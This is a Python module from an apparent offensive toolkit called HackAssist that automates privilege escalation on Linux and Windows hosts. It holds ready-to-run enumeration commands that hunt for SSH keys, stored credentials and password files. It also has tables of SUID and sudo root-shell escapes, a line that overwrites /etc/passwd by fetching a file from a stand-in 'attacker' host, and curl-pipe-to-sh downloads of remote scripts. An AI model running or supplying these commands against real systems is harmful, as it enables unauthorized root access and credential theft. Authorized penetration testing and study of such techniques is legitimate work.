#!/usr/bin/env python3
"""HackAssist - Privilege Escalation Auto-Exploiter."""

from ui import console, show_menu, ask, info, success, warning, error
from executor import run_with_preview, run_command


LINUX_CHECKS = {
    'Kernel Version': 'uname -a',
    'OS Release': 'cat /etc/os-release 2>/dev/null || cat /etc/*release',
    'SUID Binaries': 'find / -perm -4000 -type f 2>/dev/null',
    'SGID Binaries': 'find / -perm -2000 -type f 2>/dev/null',
    'Writable /etc/passwd': 'ls -la /etc/passwd; test -w /etc/passwd && echo "WRITABLE!"',
    'Writable /etc/shadow': 'ls -la /etc/shadow; test -w /etc/shadow && echo "WRITABLE!"',
    'Sudo Permissions': 'sudo -l 2>/dev/null',
    'Cron Jobs': 'cat /etc/crontab 2>/dev/null; ls -la /etc/cron.* 2>/dev/null; crontab -l 2>/dev/null',
    'Writable Cron': 'find /etc/cron* -writable 2>/dev/null',
    'Capabilities': 'getcap -r / 2>/dev/null',
    'Internal Ports': 'ss -tlnp 2>/dev/null || netstat -tlnp',
    'Docker Group': 'id | grep docker',
    'LXC/LXD Group': 'id | grep lxd',
    'World-Writable Files': 'find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null | head -20',
    'SSH Keys': 'find / -name id_rsa -o -name id_dsa -o -name authorized_keys 2>/dev/null',
    'Config Files with Passwords': 'grep -rl "password" /etc/ /opt/ /var/ 2>/dev/null | head -20',
    'Process as Root': 'ps aux | grep root | grep -v "\\[" | head -20',
    'PATH Hijacking': 'echo $PATH; find / -writable -type d 2>/dev/null | head -10',
    'NFS Shares': 'cat /etc/exports 2>/dev/null; showmount -e localhost 2>/dev/null',
    'Tmux/Screen Sessions': 'tmux ls 2>/dev/null; screen -ls 2>/dev/null',
}

WINDOWS_CHECKS = {
    'System Info': 'systeminfo',
    'Current User': 'whoami /all',
    'Local Users': 'net user',
    'Local Groups': 'net localgroup',
    'Admin Group': 'net localgroup administrators',
    'Unquoted Service Paths': 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\"',
    'Scheduled Tasks': 'schtasks /query /fo TABLE /nh',
    'Running Services': 'sc query state= all | findstr /i "service_name"',
    'Installed Software': 'wmic product get name,version',
    'AlwaysInstallElevated': 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul',
    'Stored Credentials': 'cmdkey /list',
    'AutoLogon': 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword"',
    'Network Shares': 'net share',
    'Firewall Status': 'netsh firewall show state',
}

SUID_EXPLOITS = {
    '/usr/bin/find': 'find . -exec /bin/sh -p \\; -quit',
    '/usr/bin/vim': 'vim -c \':!/bin/sh\'',
    '/usr/bin/nmap': 'nmap --interactive\\n!sh',
    '/usr/bin/python3': 'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    '/usr/bin/python': 'python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    '/usr/bin/perl': 'perl -e \'exec "/bin/sh";\'',
    '/usr/bin/ruby': 'ruby -e \'exec "/bin/sh"\'',
    '/usr/bin/awk': 'awk \'BEGIN {system("/bin/sh")}\'',
    '/usr/bin/less': 'less /etc/passwd\\n!/bin/sh',
    '/usr/bin/more': 'more /etc/passwd\\n!/bin/sh',
    '/usr/bin/env': 'env /bin/sh -p',
    '/usr/bin/bash': 'bash -p',
    '/usr/bin/cp': 'Copy /etc/passwd, add root user, cp back',
    '/usr/bin/wget': 'wget http://attacker/passwd -O /etc/passwd',
}

SUDO_EXPLOITS = {
    'vim': 'sudo vim -c \':!/bin/sh\'',
    'find': 'sudo find / -exec /bin/sh \\; -quit',
    'awk': 'sudo awk \'BEGIN {system("/bin/sh")}\'',
    'less': 'sudo less /etc/passwd → !/bin/sh',
    'nmap': 'sudo nmap --interactive → !sh',
    'python': 'sudo python -c \'import os; os.system("/bin/sh")\'',
    'python3': 'sudo python3 -c \'import os; os.system("/bin/sh")\'',
    'perl': 'sudo perl -e \'exec "/bin/sh";\'',
    'ruby': 'sudo ruby -e \'exec "/bin/sh"\'',
    'env': 'sudo env /bin/sh',
    'tar': 'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
    'zip': 'sudo zip /tmp/x.zip /etc/passwd -T -TT "sh #"',
    'man': 'sudo man man → !/bin/sh',
    'ftp': 'sudo ftp → !/bin/sh',
    'nano': 'sudo nano → Ctrl+R → Ctrl+X → Command: /bin/sh',
    'apt-get': 'sudo apt-get changelog apt → !/bin/sh',
    'ALL': 'sudo su - OR sudo /bin/bash',
}


def _run_checks(title, checks, session):
    console.print(f"\n[bold cyan]{title}[/bold cyan]\n")
    options = [(str(i), name) for i, name in enumerate(checks.keys(), 1)]
    options.append(("a", "Run ALL checks"))
    options.append(("0", "Back"))
    choice = show_menu(options)

    if choice == "0":
        return
    elif choice == "a":
        for name, cmd in checks.items():
            console.print(f"\n[bold cyan]--- {name} ---[/bold cyan]")
            output = run_command(cmd, capture=True, timeout=30)
            if output and output.strip():
                console.print(output[:1000])
    else:
        try:
            idx = int(choice) - 1
            name = list(checks.keys())[idx]
            run_with_preview(checks[name], session=session, stage="privesc")
        except (ValueError, IndexError):
            pass


def _suid_lookup():
    info("Checking SUID binaries...")
    output = run_command("find / -perm -4000 -type f 2>/dev/null", capture=True, timeout=30)
    if not output:
        warning("No SUID binaries found (or no access).")
        return

    found = output.strip().split('\n')
    console.print(f"\n[bold]Found {len(found)} SUID binaries[/bold]\n")

    exploitable = []
    for binary in found:
        binary = binary.strip()
        for known, exploit in SUID_EXPLOITS.items():
            if binary.endswith(known.split('/')[-1]) or binary == known:
                exploitable.append((binary, exploit))

    if exploitable:
        from rich.table import Table
        table = Table(title="Exploitable SUID Binaries!", border_style="red")
        table.add_column("Binary", style="bold red")
        table.add_column("Exploit", style="yellow")
        for binary, exploit in exploitable:
            table.add_row(binary, exploit)
        console.print(table)
    else:
        info("No known SUID exploits found. Check GTFOBins for more.")


def _sudo_lookup():
    info("Checking sudo permissions...")
    output = run_command("sudo -l 2>/dev/null", capture=True, timeout=10)
    if not output:
        warning("Cannot check sudo (no access or password required).")
        return

    console.print(output)
    console.print("\n[bold]Known sudo exploits:[/bold]")

    from rich.table import Table
    table = Table(title="Sudo GTFOBins", border_style="yellow")
    table.add_column("Binary", style="cyan")
    table.add_column("Exploit Command", style="yellow")
    for binary, exploit in SUDO_EXPLOITS.items():
        if binary.lower() in output.lower():
            table.add_row(f"[bold red]{binary}[/bold red]", exploit)
        else:
            table.add_row(binary, exploit)
    console.print(table)


def _auto_tools(session):
    tools = {
        'LinPEAS': 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
        'WinPEAS': 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -o winpeas.exe',
        'Linux Exploit Suggester': 'curl -L https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh',
        'Linux Smart Enum': 'curl -L https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh | sh',
        'pspy (process spy)': 'curl -L https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o pspy && chmod +x pspy && ./pspy',
    }
    console.print("\n[bold]Auto-Enumeration Tools[/bold]\n")
    options = [(str(i), name) for i, name in enumerate(tools.keys(), 1)]
    options.append(("0", "Back"))
    choice = show_menu(options)
    if choice == "0":
        return
    try:
        idx = int(choice) - 1
        name = list(tools.keys())[idx]
        run_with_preview(tools[name], session=session, stage="privesc")
    except (ValueError, IndexError):
        pass


def run(session):
    """Privilege escalation auto-exploiter entry point."""
    while True:
        console.print("\n[bold green]PRIVILEGE ESCALATION AUTO-EXPLOITER[/bold green]\n")
        options = [
            ("1", "Linux Enumeration Checks"),
            ("2", "Windows Enumeration Checks"),
            ("3", "SUID Binary Lookup"),
            ("4", "Sudo Exploit Lookup"),
            ("5", "Auto-Enum Tools (LinPEAS, etc.)"),
            ("0", "Back to Main Menu"),
        ]
        choice = show_menu(options)

        if choice == "0":
            break
        elif choice == "1":
            _run_checks("Linux PrivEsc Checks", LINUX_CHECKS, session)
        elif choice == "2":
            _run_checks("Windows PrivEsc Checks", WINDOWS_CHECKS, session)
        elif choice == "3":
            _suid_lookup()
        elif choice == "4":
            _sudo_lookup()
        elif choice == "5":
            _auto_tools(session)
